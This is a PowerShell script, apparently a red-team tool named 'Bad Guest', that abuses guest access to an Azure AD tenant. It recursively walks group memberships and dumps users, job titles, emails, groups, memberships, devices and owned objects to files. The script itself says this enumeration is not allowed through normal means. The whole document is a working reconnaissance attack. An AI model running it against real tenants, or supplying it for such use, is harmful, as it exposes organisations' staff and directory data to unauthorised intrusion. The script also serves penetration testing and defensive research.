 # bad guest - do user enumeration as a lowly guest
# this is not allowed through any normal means
# 2021 @nyxgeek - TrustedSec


param([string] $tenantid,
        [switch] $verbose
      )

$ownerids_array=@()
$groupids_array=@()
$groupmemberids_array=@()

$userlist_array=@()
$grouplist_array=@()
$groupmembership_array=@()
$devicelist_array=@()
$azureobjectlist_array=@()




# full yolo
$WarningPreference = 'SilentlyContinue'


function displayArrayStats(){

    if ($ownerids_array){
        Write-Host "Here is our current list of owner objectIds:"
        $temparray = $script:ownerids_array | sort -u
        foreach ($item in $temparray){ Write-Host "$item" }
    }else{
        Write-Host "No owner objectIds for target tenant"
    }

    if ($groupmemberids_array){
        Write-Host "Here is our current list of user objectIds:"
        $temparray = $script:groupmemberids_array | sort -u
        foreach ($item in $temparray){ Write-Host "$item" }
    }else{
        Write-Host "No user objectIds for target tenant"
    }

    if ($groupids_array){
        Write-Host "Here is our current list of group objectIds:"
        $temparray = $script:groupids_array | sort -u
        foreach ($item in $temparray){ Write-Host "$item" }
    }else{
        Write-Host "No group objectIds for target tenant"
    }

}


function magic($temp_objectId){
    # Enumerate the groups our current user belongs to
    if ($verbose){echo "Testing $temp_objectId"}
    $usergroups = Get-AzureADUserMembership -ObjectId $temp_objectId | Where-Object -Property ObjectType -eq "Group" | Select-Object -Property ObjectId

    #make sure it's not empty
    if ($usergroups){
        $usergroups | %{  $script:groupids_array += $_.ObjectId }

        # for each of the groups we belong to, get the Owner's ObjectIds. These will usually belong to the target domain.
        $usergroups | %{ Get-AzureADGroupOwner -ObjectId $_.ObjectId | %{ $script:ownerids_array += $_.ObjectId  }  }

        # for each of the groups we belong to, get the user's ObjectIds if they are NOT an EXT user
        $usergroups | %{ Get-AzureADGroupMember -ObjectId $_.ObjectId | Where-Object -Property UserPrincipalName -NotLike "*EXT*" | %{ $script:groupmemberids_array += $_.ObjectId  }  }
    }else{
        write-host "No dice, bucko. Your user isn't a member of any groups :("
    }
}


Write-Host "`n**********************************************************************"
Write-Host "*************************      BAD GUEST       ***********************"
Write-Host "**********************************************************************"
Write-Host "******   A tool for abusing Guest Access to Enumerate Azure AD *******"
Write-Host "****** *******   2021.10.09  @nyxgeek - TrustedSec    *******  *******"
Write-Host "**********************************************************************"
Write-Host "**********************************************************************`n"



# Connect to Azure - We need to do this whether or not we know the tenant
Write-Host "Connecting with Connect-AzAccount"
Connect-AzAccount

#Start-Sleep -Seconds 1
#Write-Host "**********************************************************************"
$target_tenantid = ""
if ( $tenantid ){
    $target_tenantid = $tenantid
    #echo "total tenant count is $($target_tenantid.count)"
    echo "Tenant id supplied: $target_tenantid"
}else {
        #echo "`nNo tenant id supplied -- will get it now"

        #Retrieve a list of tenant IDs
        Start-Sleep -Seconds 1
        $target_tenantid = $(Get-AzTenant).id

        #If there's more than 1 tenant, the user must select one
        if ($target_tenantid){
            #write-host "`nMore than one tenant detected:"
            #write-host "$target_tenantid".replace(" ","`n")
            Get-AzTenant | Select-Object -Property Name,Domains,id
            $tenant_searchstring = Read-host -prompt "`nPlease enter part of a domain name to match on"
            # we match but only take the first item returned. if they chose a non-uniq string it's user error
            $target_tenantid = $(Get-AzTenant | Where-Object -Property Domains -like "*$($tenant_searchstring)*" | Select-Object -First 1 ).id 
    
        }


    }


Write-Host "Getting an access token in tenant $target_tenantid"
# Getting an access token for Graph
$newtoken = Get-AzAccessToken -TenantId $target_tenantid -Resource "https://graph.microsoft.com/"

# Getting information about current user via Graph
$graphresponse = Invoke-RestMethod https://graph.microsoft.com/v1.0/me -Headers @{Authorization = "Bearer $($newtoken.token)"}

# Getting our current user's ObjectId
$currentuser_objectid = $graphresponse.id
Write-Host "Successfully retrieved current user objectId: $currentuser_objectid"




# Connect to AzureAD Target Tenant
#   Note: I tried to re-use our access token from earlier as aadaccesstoken and 
#   prompts for username. Put in email, but without EXT stuff. Only returns 1 user.
#   Might dig into this later.
Write-Host "Connecting with Connect-AzureAD"
Connect-AzureAD -TenantId $target_tenantid


#Write-Host "You will need your Guest Account UUID - see blog post http://asdfasdfadsfa/here"
#$currentuser_objectid = Read-Host "Enter your guest account UUID:"


########################### ############################ ##############################


### SETTING UP FOLDER FOR OUR DUMP
[boolean]$pathIsOK = $false
$projectname = Read-host -prompt "Please enter a project name"
$inputclean = '[^a-zA-Z]'
$projectname = $projectname.Replace($inputclean,'')


while ($pathIsOK -eq $false){

    if (-not(Test-Path $projectname)){
        try{
            md $projectname > $null
            $CURRENTJOB = "./${projectname}/${projectname}"
            [boolean]$pathIsOK = $true
            }
        Catch{
            echo "Error trying to create path"
        }

    }else{
        $projectname = Read-host -prompt "File exists. Please enter a different project name"
        $inputclean = '[^a-zA-Z]'
        $projectname = $projectname.Replace($inputclean,'')
        [boolean]$pathIsOK = $false
    }

}



########################### ############################ ##############################

Write-Host "`n**********************************************************************"
Write-Host "*******************   MINING FOR OBJECTID GUIDS   ********************"
Write-Host "**********************************************************************`n"

# NOW THE MAGIC :)

[boolean]$areWeDoneChecking = $false
$currentRound=1
$itemcount=0
$lastcount=0
$groupmemberids_array += $currentuser_objectid

while ($areWeDoneChecking -eq $false){
    Write-Host "Round $currentRound @ $(date)"
    $temparray = $ownerids_array + $groupmemberids_array | sort -Unique
    $itemcount = $temparray.Count
    "Total users enumerated is $itemcount"
    foreach ($user_objectid in $temparray){
        try{
            magic $user_objectid
            }
        Catch{
            echo "whoops"
        }
    }
    if ($lastcount -eq $itemcount ){
        Write-Host "Looks like we've hit the max number of objects we are going to get..."
        [boolean]$areWeDoneChecking = $true
    }else{
        $lastcount = $itemcount
        [boolean]$areWeDoneChecking = $false
    }
    $currentRound++

}



if ($verbose){ 
    displayArrayStats 
    }


########################### PHASE 2 - GATHER WHAT WE CAN ##############################

Write-Host "`n**********************************************************************"
Write-Host "*************************  LET'S BE BAD GUYS   ***********************"
Write-Host "**********************************************************************`n"


Write-Host -NoNewline "[*] Retrieving AzureAD Domain Information ... "
$domain_info = Get-AzureADDomain
$domain_info |  Select-Object -Property * | Out-file -FilePath .\${CURRENTJOB}.GuestAccess.DomainInfo.txt
Write-Host "`t`t`tDONE"



Write-Host -NoNewline "[*] Retrieving AzureAD User Information ..."
foreach ($user_objectid in $temparray){ $userlist_array += Get-AzureADUser -ObjectId $user_objectid }
Write-Host "`t`t`tDONE"

Write-Host -NoNewline "[*] Creating simple Azure AD user list ... "
# if we just are lazy and use ft, then our output file will have whitespace at the end :-/
foreach($line in $userlist_array){$line.UserPrincipalName.Trim(" ") | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Userlist.txt }
foreach($line in $userlist_array){echo "$($line.DisplayName), $($line.UserPrincipalName), $($line.Department), $($line.JobTitle), $($line.OtherMails), $($line.ObjectId)" | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Userlist_Detailed.txt } 
Write-Host "`t`t`tDONE"

Write-Host -NoNewline "[*] Grabbing O365 LDAP style user data ... "
$userlist_array | Select-Object -Property * | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Userlist_LDAP.txt
Write-Host "`t`t`tDONE"



Write-Host -NoNewline "[*] Getting Group list ..."
$temp_groupids = $groupids_array | sort -Unique
foreach ($group_objectid in $temp_groupids){ $grouplist_array += Get-AzureADGroup -ObjectId $group_objectid }
foreach($line in $grouplist_array){$line.DisplayName.Trim(" ") | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Grouplist.txt }
foreach($line in $grouplist_array){$line | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Grouplist2.txt }

foreach($line in $grouplist_array){echo "$($line.DisplayName), $($line.Mail), $($line.Description), $($line.ObjectId)" | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.Grouplist_Detailed.txt } 
Write-Host "`t`t`t`t`tDONE"

Write-Host -NoNewline "[*] Getting Group Membership (this could take a while...) "
foreach ($line in $grouplist_array){
    $groupmembership_list = Get-AzureADGroupMember -ObjectId  $line.ObjectId -All $true | Select-Object  -Property UserPrincipalName
    $gml_temp = $groupmembership_list | %{Write-Output "$($line.DisplayName.Trim(" ")):$($_.UserPrincipalName)"} | Sort-Object | Get-Unique 
    $gml_temp | Add-Content -Path .\${CURRENTJOB}.GuestAccess.GroupMembership.txt

}
Write-Host "`tDONE"

if ($verbose){
    Write-Host "`n*********************************************************************`n"
    write-host "Group Membership:"
    write-host "$gml_temp"
    Write-Host "`n*********************************************************************`n"
}

Write-Host -NoNewline "[*] Getting Devices"
foreach ($user_objectid in $temparray){ $devicelist_array += Get-AzureADUserRegisteredDevice -ObjectId $user_objectid }
Write-Host "`t`t`t`t`t`tDONE"

Write-Host -NoNewline "[*] Creating simple Azure AD device list ... "
# if we just are lazy and use ft, then our output file will have whitespace at the end :-/
foreach($line in $devicelist_array){
    if ($line.DisplayName){
        $line.DisplayName.Trim(" ") | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.DeviceList.txt 
    }
} 
echo "`t`t`tDONE"




Write-Host -NoNewline "[*] Getting objects owned by user ... "
foreach ($user_objectid in $temparray){
    $azureobjectlist_array += Get-AzureADUserOwnedObject -ObjectId $user_objectid
}
    #$azureobjectlist_array | Where-Object -Property ServicePrincipalType -Match "Application" | Select-Object -Property ObjectId,DisplayName,Homepage,PublisherDomain | ft | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.AzureObjects_List1.txt 
    $azureobjectlist_array | Where-Object -Property ObjectType -Match "Application" | Select-Object -Property ObjectId,DisplayName,Homepage,PublisherDomain | sort -Unique | ft | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.AzureObjects_Applications.txt 
    $azureobjectlist_array | Where-Object -Property ObjectType -Match "Group" | Select-Object -Property ObjectId,DisplayName,Description | Sort -Unique | ft | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.AzureObjects_Groups.txt 
    #$azureobjectlist_array | Where-Object -Property ObjectType -Match "Group" | Select-Object -Property *| Sort -Unique  | Out-File -Append -FilePath .\${CURRENTJOB}.GuestAccess.AzureObjects_Groups2.txt 
    echo "`t`t`t`tDONE"
echo "____________________________________"






 
